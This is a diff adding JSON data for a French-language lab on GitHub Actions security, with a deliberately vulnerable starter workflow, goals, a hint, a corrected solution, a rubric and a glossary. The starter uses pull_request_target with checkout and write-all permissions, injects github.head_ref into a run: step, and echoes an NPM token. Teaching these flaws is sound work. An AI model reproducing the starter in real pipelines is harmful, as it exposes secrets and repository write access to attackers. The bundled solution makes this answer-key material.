+   "intro": "Objectif : aucun problème bloquant ni avertissement.",
+   "starter": "name: CI\non:\n  pull_request_target:\n  push:\n    branches: [main]\npermissions: write-all\njobs:\n  test:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@main\n      - uses: actions/setup-node@v4\n      - run: echo \"Branche ${{ github.head_ref }}\"\n      - run: npm ci && npm test\n        env:\n          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n      - run: echo ${{ secrets.NPM_TOKEN }}\n",
+   "goals": [
+    {
+     "type": "noSeverity",
+     "label": "Aucun problème bloquant",
+     "severity": "blocking"
+    },
+    {
+     "type": "noSeverity",
+     "label": "Aucun avertissement",
+     "severity": "warning"
+    },
+    {
+     "type": "noRule",
+     "label": "Plus de write-all",
+     "rule": "GH003"
+    },
+    {
+     "type": "noRule",
+     "label": "Plus de pull_request_target avec checkout",
+     "rule": "GH004"
+    }
+   ],
+   "hint": "Reprenez les labos : déclencheur pull_request, permissions en lecture, empreintes, env: pour les données tierces, aucun secret affiché, timeout.",
+   "solution": "name: CI\non:\n  pull_request:\n  push:\n    branches: [main]\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 15\n    steps:\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n        with:\n          persist-credentials: false\n      - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0\n      - env:\n          BRANCHE: ${{ github.head_ref }}\n        run: echo \"Branche $BRANCHE\"\n      - run: npm ci && npm test\n"
+  },
+  "rubric": [
+   {
+    "criterion": "Permissions",
+    "levels": [
+     "write-all ou par défaut",
+     "contents: read global",
+     "Lecture globale, écriture ciblée par job et justifiée"
+    ]
+   },
+   {
+    "criterion": "Dépendances",
+    "levels": [
+     "Étiquettes mobiles",
+     "Empreintes de commit",
+     "Empreintes tenues à jour par Dependabot, actions tierces minimales"
+    ]
+   },
+   {
+    "criterion": "Contributions externes",
+    "levels": [
+     "pull_request_target + checkout",
+     "pull_request",
+     "pull_request et approbation des nouveaux contributeurs"
+    ]
+   },
+   {
+    "criterion": "Secrets",
+    "levels": [
+     "Affichés ou injectés",
+     "Passés par env:",
+     "Environnement protégé, secrets limités au job de déploiement"
+    ]
+   },
+   {
+    "criterion": "Exploitation",
+    "levels": [
+     "Pas de délai",
+     "timeout-minutes",
+     "Délais, concurrence (cancel-in-progress) et cache"
+    ]
+   }
+  ]
+ },
+ "glossary": [
+  {
+   "term": "Pull request",
+   "definition": "Proposition de fusion d'une branche, discutée et relue."
+  },
+  {
+   "term": "Fork",
+   "definition": "Copie d'un dépôt sous un autre compte."
+  },
+  {
+   "term": "Ruleset",
+   "definition": "Ensemble de règles protégeant des branches ou des tags."
+  },
+  {
+   "term": "CODEOWNERS",
+   "definition": "Fichier désignant les relecteurs par chemin."
+  },
+  {
+   "term": "Issue",
+   "definition": "Ticket de suivi (bug, idée, tâche)."
+  },
+  {
+   "term": "Release",
+   "definition": "Version publiée, associée à un tag, avec notes et artefacts."
+  },
+  {
+   "term": "SemVer",
+   "definition": "Numérotation MAJEUR.MINEUR.CORRECTIF."
+  },
+  {
+   "term": "Workflow",
+   "definition": "Fichier YAML de GitHub Actions dans .github/workflows/."
+  },
+  {
+   "term": "GITHUB_TOKEN",
+   "definition": "Jeton automatique fourni à chaque exécution de workflow."
+  },
+  {
+   "term": "Épinglage",
+   "definition": "Référencer une action par empreinte de commit."
+  },
+  {
+   "term": "Injection de script",
+   "definition": "Donnée tierce interprétée comme du code dans run:."
+  },
+  {
+   "term": "pull_request_target",
+   "definition": "Déclencheur s'exécutant avec les droits du dépôt cible."
+  },
+  {
+   "term": "Environment",
+   "definition": "Cible de déploiement avec approbations et secrets dédiés."
+  },
+  {
+   "term": "Jeton fine-grained",
+   "definition": "Jeton limité à des dépôts, permissions et durée."
+  }
+ ]
+}
